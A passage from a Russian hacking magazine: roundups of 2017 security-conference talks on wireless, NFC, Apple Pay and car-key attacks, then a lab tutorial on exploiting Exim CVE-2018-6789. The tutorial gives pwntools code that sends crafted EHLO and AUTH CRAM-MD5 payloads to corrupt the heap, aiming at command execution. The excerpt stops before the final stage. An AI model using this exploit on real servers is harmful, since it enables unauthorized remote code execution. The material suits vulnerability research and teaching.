аккаунты  этих  сотрудников  в  дру гих соцсетях,  например  в  Facebook.
При помощи веб‐сервиса атакующий может собрать интересную статистику
своих жертв, например где и в каких отелях они «чекини лись». Далее от име‐
ни отеля злодей может отпра вить сооб щение с напоминанием об оплате
некоторых Resort Fee и прикрепленным инвой сом в виде PDF‐документа.
Proﬁt!


RECON КАК ИСКУССТВО
Тема извлечения данных об объекте атаки очень обширна, и об одной только
разведке на осно ве открытых источников написана не одна книга. По этой
причине я и сфо кусировал внимание на сборе техничес кой информации
о периметре — именно в нем зачас тую содержатся незакрытые две ри,
которые не патчатся годами и о которых может не знать сам владелец.
  В дополнение к это му ата кующий, про бира ющийся через внешние ресур‐
сы, не взаимодействует с человеком (как это про исходит в случае с социаль‐
ной инженерией), а значит, единс твенное препятствие — это все возможные
IDS/IPS, WAF и все, что фиксирует активность на периметре. Если эти средс‐
тва там вообще есть.
ВЗЛОМ

 ЛУЧШЕЕ
 С МИРОВЫХ
 ИБ-КОНФЕРЕНЦИЙ





     КАК ВЗЛОМАТЬ NFC И APPLE PAY
        И УРОНИТЬ ЧЕЛОВЕКА
          С ГИРОСКУТЕРА




Продолжаем держать тебя в курсе самых
интересных докладов с мировых хакерских
конференций. Если не читал предыдущие
выпуски (они во многом еще актуальны):
вот и вот. В сегодняшнем материале — все,           Антон Карев                                                                                    Эксперт по информационной
что связано с уязвимостями беспро водных       безопасности.высшее, специальностьОбразование
технологий. И между про чим, делись в ком‐      компьютерных«Защита информациисистемах»,в в
ментах лекциями и докладами, которые ты      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
нашел без нашей помощи: user‐generated      интересов — технологическая
                                                                                         разведка, аналитика в сфере
                                                                                      ИБ, искусственныйcontent Роскомнад зор еще не зап ретил. :).
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ru
ВЗЛОМ УМНОГО ПИСТОЛЕТА
Popping a Smart Gun // DEF CON. 2017
  Умные пистолеты продают с обещанием: стрелять они будут только из рук
авторизованных  пользователей. В  кино  такие обе щания, может  быть,
и работают, но в реальности дела обсто ят ина че.
  В этом докладе исследуется безопас ность одного из таких умных пис‐
толетов,  который  доступен  в  продаже  для широкой общественности,
и демонстрируются три его уязвимос ти. Во‐первых, показано, как из пис‐
толета можно стре лять даже вдали от его хозя ина. Во‐вторых, как заблокиро‐
вать стрельбу, даже если выстрелить хочет законный владелец пистолета.
В‐третьих, как стрелять из пистолета даже без авторизации, без пред‐
варительного физического контакта с целевым пис толетом и без его
модификации.





DIRTYTOOTH: ПОЛУЧИЛ МУЗЫКУ — ПОТЕРЯЙ КОНТАКТЫ
Kevin Mitnick. DirtyTooth: Put music & lose your contacts // ToorCon.
2017
  Доклад Кевина Митника, легендарного персонажа хакерской сцены.
В последнее время его имя обычно всплывает только при обсуждении соци‐
альной инженерии, но, как можно видеть из этого доклада, социальная инже‐
нерия — далеко не единс твенное, в чем Митник силен.
   Bluetooth‐ком муникации сегодня на подъеме. Миллионы людей пользуют‐
ся этой технологией для комфортно го подключения к периферийным устрой‐
ствам. В докладе представлен трюк/хак для iOS 10.3.2 (и более ранних вер‐
сий этой ОС) для взло ма механизма управления профилями. Из‐за утечки
информации с iOS‐девайсов, вызванной некорректным управле нием про‐
филями, у злоумышленника существу ет техническая воз можность извлечь
немало конфиденциаль ных данных пользователя с девайса, работающего
под управлением iOS.





МАНИПУЛИРУЕМ IOT-ДЕВАЙСАМИ ЧЕРЕЗ РАДИОСИГНАЛЫ
Caleb Madrigal. Controlling IoT devices with crafted radio signals //
DEF CON. 2017
   Этот доклад — идеальный экскурс в работу бес провод ной связи. В док‐
ладе продемонстрировано, как захватывать цифровые данные в режиме
реального времени (при помощи SDR), — вплоть до того, что показы вается,
как именно информационные биты передаются. Объясняется, как прос‐
матривать, прослушивать, вос производить бес провод ные сигналы и манипу‐
лировать  ими,  как  прерывать  беспроводные  коммуникации  и  даже
как генерировать новые радиоволны с нуля — иначе говоря, делать ради‐
оинъекции (радиоинъекции могут быть полез ны при фаззинге и  брут‐
форс‐атаках).
  Докладчик также демонс трирует разработанные собственноручно инстру‐
менты (на базе SDR), облегчающие перехват и генерацию беспровод ных
цифровых сигналов.





КЛОНИРОВАНИЕ RFID-МАЯЧКОВ В ПОЛЕВЫХ УСЛОВИЯХ В
РЕЖИМЕ РЕАЛЬНОГО ВРЕМЕНИ
Dennis Maldonado. Real-time RFID Cloning in the Field // DEF CON.
2017
  Сегодня существует мно го довольно неп лохих решений для клонирования
RFID‐маячков. Однако процесс кло нирования, как правило, медленный, уто‐
мительный и чре ват ошибками. Что, если бы появился новый способ клониро‐
вания бейджей с RFID‐начинкой, свободный от всех этих проблем?
  В этом докладе представлен более умный спо соб клонирования RFID‐
маячков, который возможно проводить в полевых условиях. В докладе рас‐
смотрены наиболее популярные из инс тру ментов и методов для дальнодей‐
ствующего RFID‐клонирования. Затем обсужда ется и демонстрируется новый
метод, который позволя ет кло нировать RFID‐маячки в полевых условиях —
в считаные секунды.





НОВАЯ ВЕРСИЯ MITM-АТАКИ: MAN IN THE NFC
Haoqi Shan. Man in the NFC: Build a NFC proxy tool from sketch //
DEF CON. 2017
   Технология NFC  (Near  Field  Communication)  широко  используется
в областях, напрямую свя занных с финансами и дос тупом к чувствительной
информации. Уве рен,  что любой,  кто  когда‐либо  «платил телефоном»
или смарт‐часами, со мной сог ласится. :) Где день ги — там хакеры, и неуди‐
вительно, что против этой технологии пос тоянно придумывают новые атаки.
  В докладе представлен инс трумент для проведения одной из таких атак —
аппаратная примочка  UniProxy, построенная на базе микроконтроллера
PN7462AU (ARM’ированный чип с NFC‐железом на борту). Этот инструмент
состоит из двух устрой ств, каждое из которых осна щено радиопе редатчиком
и самомодифицирующимся высокочастотным картридером. Одно из устрой‐
ств ведущее, другое ведомое. «Ведущая» часть позволяет легко и быстро
считывать практически все смарт‐карты типа ISO 14443A (независимо от того,
каково назначение этой карты: банковская, удос товере ние, паспорт, карта
доступа или какая‐либо другая; какой протокол безопас ности на смарт‐карте
используется — тоже не имеет зна чения, главное, чтобы он соответс твовал
стандарту ISO 14443A) и перенаправлять считанные данные к легальному кар‐
тридеру посредством «ведомо го» устройства. Ведущий и ведомый компонен‐
ты этого инструмен та взаимо действу ют через радиопе редатчики, находясь
на расстоянии до 200 м.





АЗЫ РАДИОХАКИНГА: МЕТОДЫ БЕСПРОВОДНЫХ АТАК
Matt Knight, Marc Newlin. Radio Exploitation 101: Characterizing,
Contextualizing, and Applying Wireless Attack Methods // DEF CON.
2017
   Что общего у взлома противо торнадной сирены Далласа, у взлома элек‐
троскейтов и у взло ма умных дверных замков? Уяз вимые протоколы бес про‐
водных коммуникаций!
  Взлом беспроводных устройств ста новится все более распространенным
явлением — благодаря тому, что набирают популярность IoT и радиочас‐
тотные протоколы с управлением через мобильники. Хотя все те радиочас‐
тотные протоколы, которые не относятся к категории Wi‐Fi и Bluetooth, оста‐
ются для многих практикующих безопас ников тайной, покрытой мраком, взла‐
мывать их намного проще, чем может показаться. Этот доклад закладывает
фундаментальные  осно вы  современного  радиоха кинга. После  ввод ной
информации про основополага ющие ради очас тотные концепции докладчик
представ ляет классификацию беспро водной угрозы. Описывая беспровод‐
ные атаки, докладчик проводит параллели с клас сическими экс плоитами
для проводных сетей, а также выделяет моменты, которые уникальны только
для беспроводных сетей. Подкрепляет описываемые концепции живыми
демонстрациями, реализованными на SDR‐девай се и аппаратном радио.
  Доклад помогает сфор мировать ясное понимание, как взламывают бес‐
проводные сети и как применить свои навыки экс плуатации проводных сетей
к сетям беспроводным.





НОВЫЕ ПРИКЛЮЧЕНИЯ 3G/4G-ШПИОНА
New Adventures in Spying 3G and 4G Users: Locate Track & Monitor
// Black Hat. 2017
   Сказать, что 3G/4G‐девайсы популярны, — значит ничего не сказать. Тем,
что все они уязвимы для IMSI‐перехватчиков, также известных как СКАТы,
сейчас тоже никого не удивишь. Ата ки на 3G/4G‐сети посредством IMSI‐
перехватчиков уже давно извес тны, хорошо описаны и дос тупны для широкой
общественности. Однако в этом докладе расска зывается про новые векторы
атаки — которые позволя ют вес ти трекинг и монито рить активность мобиль‐
ных девайсов.
  В частности, описана новая уязвимость в широко распространенном
в сетях 3G/4G криптографическом про токоле. Описываются различные спо‐
собы эксплуатации этой уязвимости с использованием недорогого оборудо‐
вания. Кроме того, докладчик проводит несколько демонстрационных атак,
чтобы показать, к каким пос ледствиям для конечных пользовате лей 3G/4G‐
девайсов может привести эта уязвимость.





УЛЬТРАЗВУКОВАЯ ПУШКА ПРОТИВ УМНЫХ ГАДЖЕТОВ
Sonic Gun To Smart Devices: Your Devices Lose Control Under Ultra-
sound/Sound // Black Hat. 2017
  MEMS‐сенсоры, такие как акселерометр и гироскоп, — обязательные
и незаменимые компонен ты современных умных гаджетов. Авторы доклада
обнаружили связанную с ними уязвимость: сенсоры умных гаджетов резони‐
руют от акустических волн на некоторых час тотах, что приводит к искажению
показаний сенсора.
   Разработав методо логию ата ки, исследователи смогли манипулировать
данными посредством точной подстройки парамет ров для аксе лерометра
и гироскопа. Кроме того, докладчик представляет комбинированную атаку,
которая использует оба сенсора и поэтому более гиб ка. Докладчик под робно
описывает влияние найденной уяз вимости на самые разнообразные гаджеты
с MEMS‐сенсорами на борту: VR‐девайсы, средства передвижения с авто‐
балансиров кой, дроны и другие. При помощи собранной в домашних усло‐
виях ультразвуковой системы докладчик ата кует популярные VR‐девайсы,
в том числе смартфоны iPhone 7 и Galaxy S7. Докладчик показывает, как, воз‐
действуя на эти умные девайсы ультразвуком на резонансных частотах, мож‐
но манипулировать «виртуальной реальностью». Например, управлять нап‐
равлением взгляда без каких‐либо дви жений со стороны пользовате ля
или вызывать землетрясение с различными магнитудами. Такое развитие
событий может шокировать некото рых пользователей, потому что оно про‐
тиворечит их фактическим ощущениям; из‐за этого они могут упасть с гирос‐
кутера и травмироваться.
  Докладчик рассказывает, как атаковал мультикоптер DJI и смог изменить
его траекторию.
   Таким образом, описыва емая ультраз вуковая атака способна лишать
пользователей контроля над их умны ми гаджетами. А в случае с VR‐сис‐
темами и средствами передвижения с автобалансировкой эта атака способ‐
на привести к серьезным физическим травмам.





APPLE PAY — «САМАЯ БЕЗОПАСНАЯ» ФОРМА ОПЛАТЫ
Timur Yunusov. The Future of ApplePwn — How to Save Your Money
// Black Hat. 2017
   Как нетрудно догадаться из названия (особенно из кавычек вокруг «самая
безопасная»), док ладчик подробно рас сматривает уязвимос ти этого платеж‐
ного сервиса.
   Такие характеристики Apple Pay, как выделен ный процессор для проведе‐
ния платежных транзакций (выполненный в качестве защищенного анклава),
передача и хранение платежной информа ции (за пределами анклава) исклю‐
чительно в зашифрованном виде, на первый взгляд, делают эту систему неп‐
риступной для злоумышленника. Одна ко докладчик пред ставляет специали‐
зированный софт с открытым исходным кодом, поз воляющий обойти всю эту
защиту и превратить iPhone с поддержкой Apple Pay в настраиваемый жучок
для клонирования банковских карт. Также докладчик показывает, что Apple
Pay API предоставляет намного больше функций, чем нужно для эмуляции
банковской карты, — функций, которые дают потенциальному злоумышленни‐
ку обширные возможнос ти в манипу лировании торговым оборудовани ем
через iPhone.
  Под конец док ладчик резюмирует безапел ляционным  утверждением:
«Может быть, кто‐то и считает, что Apple Pay — это самая безопас ная форма
оплаты, но мы‐то знаем, что Apple Pay представляет собой перспективный
инструмент для кардинга».





WIFUZZ: ОБНАРУЖЕНИЕ И ЭКСПЛУАТАЦИЯ ЛОГИЧЕСКИХ
УЯЗВИМОСТЕЙ В КРИПТОГРАФИЧЕСКОМ РУКОПОЖАТИИ WI-FI
Mathy Vanhoef. WiFuzz: detecting and exploiting logical flaws in the
Wi-Fi cryptographic handshake // Black Hat. 2017
  Шифрованный Wi‐Fi приобретает все большую популярность. Такие новые
стандарты, как Hotspot 2.0 и Opportunistic Wireless Encryption, тому под‐
тверждение. Hotspot 2.0 упрощает поиск и выбор сети, создавая инфраструк‐
туру, действующую по тому же принципу, что и роуминг в сотовых сетях.
С другой стороны, Opportunistic Wireless Encryption вводит неавторизованное
шифрование для сетей  Wi‐Fi. Задумка этих решений хорошая. Но они
не будут иметь ровным счетом никакого смыс ла, если при реализации
четырехэтапного криптографичес кого рукопожатия Wi‐Fi (во время которого
девайсы договариваются о новых сессионных клю чах) допущены ошибки.
  В этом докладе рассказывается и демонстри руется, как обнаруживать уяз‐
вимости в реализации это го рукопожатия и как злоупотреблять ими. При чем
здесь речь идет не о тра диционных ошиб ках программи рования (таких
как переполнение буфера или повторное освобождение  памяти), а о
логических уязвимостях. Примером логической уязвимос ти может быть ситу‐
ация, когда при рукопожатии некото рые сообщения пропускаются, в резуль‐
тате чего могут быть использованы неинициализированные криптографичес‐
кие ключи. Очевидно, что подобные уяз вимос ти сво дят на нет любые гаран‐
тии безопасности. Чтобы обна ружить такие логические уязвимости, док‐
ладчик сначала строит модель рукопо жатия Wi‐Fi, которая описывает ожи‐
даемое поведение. Далее автоматичес ки генери рует пол ный набор некор‐
ректных вариантов рукопожатия и затем проверяет, правильно ли на них
реагирует реализованная модель (соот ветству ет ли ее ответ идеализирован‐
ной модели).
  Докладчик протестировал двенадцать точек дос тупа Wi‐Fi и в каждой обна‐
ружил уязвимости. Среди них: воз можность обхода процедуры аутентифика‐
ции, снятие «отпе чатков пальцев», атака на понижение защиты, DoS‐атаки
и другие. Наиболее чувствитель ные уязвимос ти найдены в OpenBSD. Первая
из них может быть экс плуатирова на для DoS‐атаки на точку дос тупа. Вто‐
рая — для MiTM‐атаки против клиентов WPA1 и WPA2. Докладчик также обна‐
ружил уязвимости, позволяющие провести «ата ку на понижение» против Me‐
diaTek и Broadcom, которая заставляет использовать TKIP и RC4. Кроме того,
докладчик нашел уязвимости, которыми можно зло употреблять для DoS‐ата‐
ки против Windows 7, а также ряд уязвимос тей в реализаци ях для Aerohive,
Apple, Cisco, Hostapd и Windows 10.





«ПРИЗРАЧНЫЙ ТЕЛЕФОНИСТ» ВЫДАЕТ СЕБЯ ЗА ВАС
ПОСРЕДСТВОМ LTE CSFB
«Ghost Telephonist» Impersonates You Through LTE CSFB // Black
Hat. 2017
  В  докладе  представлена  одна  из  уяз вимос тей  CSFB‐коммутации
в сотовой сети 4G LTE. Докладчик обнаружил, что при CSFB‐коммутации про‐
цедура аутентификации отсутствует. Это дает потенциальному злоумыш‐
леннику возможность перехватывать все коммуникации жертвы. Разработан‐
ную на основе этой уязвимос ти атаку докладчик назвал «призрачный телефо‐
нист».
   Эта уязвимость позволя ет изготовить нес колько эксплоитов. Во‐первых,
когда звонок или SMS не зашифрованы или зашифрованы слабо, злоумыш‐
ленник может выдавать себя за жертву: при нимать от ее имени вызовы/сооб‐
щения, а также инициировать их. Во‐вто рых, «приз рачный телефонист» может
получить номер телефо на своей жертвы и затем использовать этот номер
для совершения продвинутой ата ки, нап ример взла мывать аккаунты в раз‐
личных интернет‐сервисах. Атака может произво диться в двух режимах: либо
на случайную, либо на конкрет ную жертву. Докладчик провел эту атаку
при помощи собственного мобильника, в немоди фицированной сети опе‐
ратора.
   Атака не нуждается в поддельной базовой станции, поэтому стоимость ее
реализации низкая. Кроме того, жертва не сможет обнаружить факт нападе‐
ния, потому что нет поддельной базовой станции и нет перевыбора соты.





ОДНА МАШИНА, ДВА РАДИОПАКЕТА: АТАКА НА АВТОМОБИЛЬНЫЕ
КЛЮЧИ HITAG-2
One Car, Two Frames: Attacks on Hitag-2 Remote Keyless Entry Sys-
tems Revisited // Proceedings of the 11th USENIX Workshop on Of-
fensive Technologies (WOOT). 2017
  Начиная с 2006 года появилось мно го публикаций, анализи рующих
безопасность алго ритма Hitag‐2 в контексте контроля доступа к автомоби‐
лям. Хотя криптография это го алго ритма уже давно сломана, он все
еще используется в авто мобильной промышленности. Плюс совсем недавно
были обнаружены новые уяз вимости у RKE‐систем (Remote Keyless Entry —
удаленный бесключевой дос туп  к автомобилю), основанных на  Hitag‐2,
которые дают возможность про вести атаку по раз блокировке автомобиля;
для этого требуется захват от четырех до восьми радиопакетов.
  Однако в докладе показано, что специфичес кие реализации RKE‐систем
на базе Hitag‐2 применя ют изящ ные контрмеры, бла годаря которым данные
RKE неуязвимы для описанной атаки. Кро ме того, в докладе пред ставлен
детальный анализ такой системы (по методу черного ящика) — начиная
от  физического/аппаратного  уровня  и  заканчивая  «непрерывно  изме‐
няющимся кодом». Наконец, в докладе рас кры вается новая криптографичес‐
кая уязвимость, которую мож но экс плуатировать для соз дания поддельных
пакетов без извлечения криптографического клю ча и открывать целевой
автомобиль — с захватом только двух ради опакетов.
  В докладе показано, что соз давать откры вающие радиофреймы возможно
и не находя сек ретный ключ; вместо этого мож но вычис лить эквивалентные
клю чи, которые позволяют получить тот же самый поток ключей Hitag‐2, что
и при использовании подлинного ключа. При такой атаке упомянутую конт‐
рмеру обойти тривиаль но — одним простым захватом дополнительного
радиопакета.
ВЗЛОМ
 КОМАНДА
  УПАСТЬ





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





    ЭКСПЛУАТИРУЕМ КРИТИЧЕСКУЮ
   УЯЗВИМОСТЬ В ПОЧТОВИКЕ EXIM 4



Когда софтина попадает под пристальный взгляд экспертов
по безопас ности, велика вероятность, что за одним багом
найдутся и другие. Так и случилось с агентом пересылки
сообщений Exim: вслед за прошлогодней уязвимостью в нем
найдена новая опасная дыра, действующая во всех версиях
вплоть до последней  (4.90.1). Поскольку Exim — штука
популярная, список потенциально уязвимых целей просто
огромен. Давай посмотрим, как эксплуати ровать эту новую
находку.


Обнаруженная проб лема — это своеоб разное про должение пре дыду щего
бага, который нашел тот же исследователь под ником Meh. На этот раз он
раскопал  возможность  переполнения  буфера  в  функции  для  работы
с кодировкой Base64.
   Уязвимость уже обза велась своим идентификатором  CVE‐2018‐6789
и получила статус критичес кой, потому что приводит к удаленному выпол‐
нению любых команд на целевой системе с пра вами пользователя, от имени
которого работает Exim. Причем не нужна ни авториза ция, ни какой‐либо дру‐
гой уровень доступа. Нужен только коннект к порту SMTP.


ГОТОВИМ ИНСТРУМЕНТЫ
Под эту уязвимость существу ет добротно нас троенный докер‐контейнер, так
что говорим спасибо товарищу под ником Skysider и запускаем:


$ docker run ‐it ‐‐rm ‐‐name exim ‐p 25:25 ‐‐cap‐add=SYS_PTRACE
‐‐security‐opt seccomp=unconfined skysider/vulndocker:cve‐2018‐6789

Пробрасываем из Docker стандартный порт, на котором висит SMTP.





                 Готовый стенд для эксплуата ции Exim

Если нужна поддержка дебаггера, то не забудь его установить и переком‐
пилировать Exim с отла дочными символами.


$ apt‐get update && apt‐get install ‐y gdb
$ cd exim‐4.89
$ printf "CFLAGS += ‐g\n" >> Local/Makefile
$ make

Также нам понадобится Python с установленным pwntools для написания
и тестирования эксплоита. Я просто раз верну еще один докер‐контейнер
на основе Debian.


$ docker run ‐it ‐‐rm ‐‐link=exim debian /bin/bash
$ apt‐get update && apt‐get install ‐y python python‐pip
$ pip install pwntools

Все готово, впе ред к победам!


РАБОТА С КУЧЕЙ
Для начала взглянем на саму провинившуюся функцию.


/src/base64.c
153: b64decode(const uschar *code, uschar **ptr)
154: {
155: int x, y;
156: uschar *result = store_get(3*(Ustrlen(code)/4) + 1);
157:
158: *ptr = result;

За выделение требуемого количес тва памяти отвечает store_get — кас‐
томная функция из набора для менеджмента памяти, который используется
в составе Exim.


/src/store.h
30: #define store_extend(addr,old,new) \
31:   store_extend_3(addr, old, new, __FILE__, __LINE__)
32:
33: #define store_free(addr)     store_free_3(addr, __FILE__,
__LINE__)
34: #define store_get(size)      store_get_3(size, __FILE__, __LINE__
)
35: #define store_get_perm(size) store_get_perm_3(size, __FILE__,
__LINE__)
36: #define store_malloc(size)   store_malloc_3(size, __FILE__,
__LINE__)
37: #define store_release(addr)  store_release_3(addr, __FILE__,
__LINE__)
38: #define store_reset(addr)    store_reset_3(addr, __FILE__,
__LINE__)
...
43: extern BOOL    store_extend_3(void *, int, int, const char *, int
);
44: extern void    store_free_3(void *, const char *, int);
45: extern void   *store_get_3(int, const char *, int);
46: extern void   *store_get_perm_3(int, const char *, int);
47: extern void   *store_malloc_3(int, const char *, int);
48: extern void    store_release_3(void *, const char *, int);
49: extern void    store_reset_3(void *, const char *, int);

Во время работы функции выделяется буфер раз мером 3*(len/4)+1 байт
для хранения декодированных данных, где len — длина передаваемых дан‐
ных. Такая формула не случайна, так как в стандарте Base64 каждые три
исходных байта кодируются четырь мя символами. В иде альных условиях раз‐
мер переданных данных всегда кра тен четырем, но, к счастью, мы живем не в
них,  и  если  передать  невалидную  кодированную  строку,  то функция
store_get получит неверное зна чение размера выделяемой памяти.





  Размеры выделяемой памяти для валидной и невалидной строки Base64

В общем случае, когда передаем стро ку размером 4n – 1, Exim зарезервиру‐
ет 3n + 1 байт, но после декодирования получится строка, итоговый раз мер
которой будет равен 3n + 2 байта, и это вызовет переполнение при попытке
записи в выделенный буфер.
   Где используется кодировка Base64? Да практически везде. Начиная
от разных типов авторизаций и заканчивая файлами, которые прикрепляются
к письмам. Все эти вещи потенциально уязвимы. Авторизация нам подходит,
так как для отправки сообщений чаще всего пот ребуется валид ный логин
и пароль. На тестовом стенде уже вклю чен механизм аутентификации CRAM‐
MD5, но подойдет и любой дру гой, который работа ет с Base64.
   Теперь немножко погово рим о работе с памятью. Как я уже писал, в Exim
существует самописный набор функций для этих целей. Функция store_mal‐
loc — вызов malloc прямиком из библиотеки glibc. Она занимается выделе‐
нием блока памяти нужного раз мера.


/src/store.c
507: void *
508: store_malloc_3(int size, const char *filename, int linenumber)
509: {
510: void *yield;
511:
512: if (size < 16) size = 16;
513:
514: if (!(yield = malloc((size_t)size)))

Каждый раз при создании нового чанка первые 16 байт занимает блок
с метаданными. Он как бы делится на два мини‐бло ка. В первом располага‐
ется размер предыдущего чанка, а во втором — раз мер текущего и флаги,
которые хранятся в первых трех битах. Пос ле этого функция возвращает ука‐
затель на начало блока с данными. Выглядит это примерно так.





                           Структура чанка

Большинство чанков, используемых при работе Exim, хранятся в виде двус‐
вязного списка (doubly linked list), который называ ется unsorted bin. Поскольку
glibc объединяет все такие чанки в один большой блок, это поз воляет избе‐
жать фрагментации. Пос ле каждого запроса на выделе ние библиотека пов‐
торно выделяет эти блоки в порядке «первым при шел — первым ушел» (FIFO).
  Из соображений производитель ности Exim предоставляет собственную
структуру связанного списка, с которой работа ют функции store_get,
store_release, store_extend и store_reset. Эта структура называется
storeblock.


/src/store.c
71: typedef struct storeblock {
72:   struct storeblock *next;
73:   size_t length;
74: } storeblock;

Посмотри на ее содержимое: помимо обычного заголовка с метаданными,
добавляется еще один. Он включает в себя адрес следующего элемента
и размер данных текущего.
  Минимальный  размер  таких  элемен тов  может  быть  8192  байт
плюс 16 байт хидера и еще 16 байт метаданных, итого — 8224 (0х2020).





                          Структура storeblock

Именно такие константы прописа ны в функции store_get.


/src/store.c
062: #define STORE_BLOCK_SIZE 8192
...
128: void *
129: store_get_3(int size, const char *filename, int linenumber)
130: {
...
143: if (size > yield_length[store_pool])
144:   {
145:   int length = (size <= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE :
size;

Чтобы успешно проэксплуатировать уяз вимость, нам нужно создать структуру
из трех частей.


НА ШАГ БЛИЖЕ К УЯЗВИМОСТИ
Для создания структуры нам нужно научить ся манипулировать чанками,
как Амаяк Акопян. Это можно устроить с помощью некоторых команд про‐
токола SMTP.
  Первая в списке — EHLO. Она используется для приветствия, которое
передается после подключения к серверу. В качестве аргумента нужно
передать полное доменное имя клиента. После того как команда отработает,
указатель на переданный домен записывается в переменную sender_host_‐
name, а после повторного выполнения команды вызывается store_free, что‐
бы освободить место для нового имени, которо му выделяется память
с помощью store_malloc.


/src/smtp_in.c
1751: static BOOL
1752: check_helo(uschar *s)
1753: {
...
1758: /* Discard any previous helo name */
1759:
1760: if (sender_helo_name != NULL)
1761:   {
1762:   store_free(sender_helo_name);
1763:   sender_helo_name = NULL;
1764:   }
...
1810: if (yield) sender_helo_name = string_copy_malloc(start);

Наряду с EHLO существуют команды MAIL и RCPT. Когда они успешно отра‐
ботают, выполнится функция smtp_reset, которая вызывает store_reset
и выполняет сброс цепочки блоков к точке сброса (reset_point). Это при‐
водит к освобождению всех чанков, выделен ных функцией store_get после
последней команды.


/src/smtp_in.c
3648: int
3649: smtp_setup_msg(void)
3650: {
...
3656: void *reset_point = store_get(0);
...
3666: smtp_reset(reset_point);
3667: message_ended = END_NOTSTARTED;


/src/smtp_in.c
1882: static void
1883: smtp_reset(void *reset_point)
...
1982: store_reset(reset_point);

Следующий помощ ник — любая неизвестная серверу команда. Если она
содержит непечатаемые символы, то они конвертируются в печатаемые,
и Exim выделяет память для их хра нения.


/src/smtp_in.c
5556:     if (unknown_command_count++ >= smtp_max_unknown_commands)
5557:       {
...
5571:       done = synprot_error(L_smtp_syntax_error, 500, NULL,
5572:         US"unrecognized command");

Команда AUTH отве чает собс твенно за аутентификацию. Здесь мы и будем
использовать перепол нение в работе с Base64. Оригинальные и декоди‐
рованные строки записываются в буфер при помощи store_get. Она, так же
как и EHLO, принимает любые символы на вход, включая нулл‐байты, что очень
поможет нам при эксплу ата ции.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

    КОМАНДА УПАСТЬ
                   ЭКСПЛУАТИРУЕМ КРИТИЧЕСКУЮ
                УЯЗВИМОСТЬ В ПОЧТОВИКЕ EXIM 4





ЭКСПЛУАТАЦИЯ
Для начала рекомендую запустить Exim через отладчик, чтобы было проще
отслеживать шаги к RCE.


$ dbg /work/exim‐4.89/build‐Linux‐x86_64/exim
$ r ‐bd ‐d‐receive ‐C conf.conf





              Запуск сервера Exim через отладчик GDB

Запускаем Python, импортируем нуж ные биб лиотеки и подключаемся к аген‐
ту.


from pwn import *
from base64 import b64encode
serv = remote("192.168.99.100", 25)





              Первые шаги в экс плуатации уязвимости

Сначала помещаем большой чанк в  unsorted  bin. Это можно сделать
с помощью команды EHLO. Отправляем в качестве аргумента строку нужного
нам размера.


serv.sendline("ehlo " + "a"*0x1000)
serv.sendline("ehlo " + "a"*0x20)





              Помещаем большой чанк в unsorted bin

Дальше  с помощью  несуществу ющей  команды  вызываем  выполнение
store_get. Можно накинуть на нее брейк‐пойнт и уви деть, что таким образом
мы размещаем структуру storeblock в осво бодившемся после прошлого
действия чанке.


serv.sendline("\xee"*0x700)





     Момент отладки во время отправки несущес твующей команды

Теперь снова отправляем команду EHLO, чтобы соз дать второй storeblock,
при этом первый освобождается, потому что отра баты вает smtp_reset. Бла‐
годаря этому мы разместили блок, в котором хранится переданный в EHLO
sender_host_name, в середине unsorted bin.


serv.sendline("ehlo " + "c"*0x2c00)





                Отладка в момент вызова smtp_reset

Теперь, когда приготовления кучи окончены, можно работать с переполнени‐
ем. Наша задача — с его помощью увеличить размер чанка. Используем
авторизацию CRAM‐MD5.


serv.sendline("AUTH CRAM‐MD5")

Высчитываем размер данных, которые нам нужно записать. Мы берем
минимальный размер  чанка, прибавляем  к нему 16 байт метаданных
и еще 7 байт, чтобы попасть в хидер storeblock, в секцию размера данных.


payload = "d"*(0x2020+0x30‐0x18‐1)

Кодируем в Base64, добавляем байт, который будет записан (0xf1), и прев‐
ращаем полученную строку в невалидный Base64.


serv.sendline(b64encode(payload)+"EfE")





             Декодирова ние невалидной строки Base64

Теперь после  конвертации  раз мер  чанка  с sender_host_name  станет
равен 0x20f1 байт. Помним, что манипулиро вать можно только одним байтом,
следовательно, мы можем менять значения в пределах 0x00–0xﬀ.
   Так как размер изменился, теперь следующий чанк начинается внутри
исходного. Это нужно пофиксить, иначе проверки целостности из библиоте ки
glibc не дадут про дол жать манипуляции с кучей.


serv.sendline("AUTH CRAM‐MD5")
payload2 = 'm'*0x70+p64(0x1f41)
serv.sendline(b64encode(payload2))

Чтобы начать контролировать содержимое созданного фейкового чанка, нуж‐
но выполнить store_free. Это можно сделать, используя все ту же команду
EHLO. Однако ее успешное выполнение приведет к вызову smtp_reset, что,
в свою оче редь, кончится кра шем процесса. Чтобы этого избежать, нужно
отправить некор ректное доменное имя в аргументах. Тогда выполнение фун‐
кции закончится раньше ресета.


serv.sendline("ehlo anything+")


/src/smtp_in.c
3882:     if (!check_helo(smtp_cmd_data))
3883:       {
3884:       smtp_printf("501 Syntactically invalid %s argument(s)\r\n
", hello);
...
1797:       if (!isalnum(*s) && *s != '.' && *s != '‐' &&
1798:           Ustrchr(helo_allow_chars, *s) == NULL)
1799:         {
1800:         yield = FALSE;
1801:         break;
1802:         }
...
1811: return yield;

Вот мы и приблизились к финальной стадии эксплуата ции. На данный момент
мы при помощи команды AUTH можем изменять указатель на адрес сле‐
дующего storeblock. Ресерчер Meh, который обна ружил уязвимость, пред‐
ложил интересную идею для выполнения произволь ного кода с уче том этой
возможности.
  В Exim есть такое понятие, как раскрываемые строки (String Expansion).
Это что‐то вроде макросов из мира шаблониза торов. Спе циальные строки
обрабатываются интерпретатором Exim, и дей ствия, которые они описывают,
исполняются. Сре ди команд есть и вызов программы:


${run{<command> <args>}{<string1>}{<string2>}}

Для парсинга такого вида строк используется функция expand_string. Она
вызывается, нап ример, в acl_check.


/src/acl.c
4268: int
4269: acl_check(int where, uschar *recipient, uschar *s, uschar **
user_msgptr,
4270:   uschar **log_msgptr)
4271: {
...
4308: rc = acl_check_internal(where, addr, s, user_msgptr, log_msgptr
);





3856: static int
3857: acl_check_internal(int where, address_item *addr, uschar *s,
3858:   uschar **user_msgptr, uschar **log_msgptr)
3859: {
...
3882: if (acl_level == 0)
3883:   {
3884:   if (!(ss = expand_string(s)))

При каждой загрузке сервер читает конфигурацию и создает таблицу гло‐
бальных указателей на ACL (Access Control List). В ней есть записи вида
acl_smtp_<команда>, где команда — это команда, к которой привязана стро‐
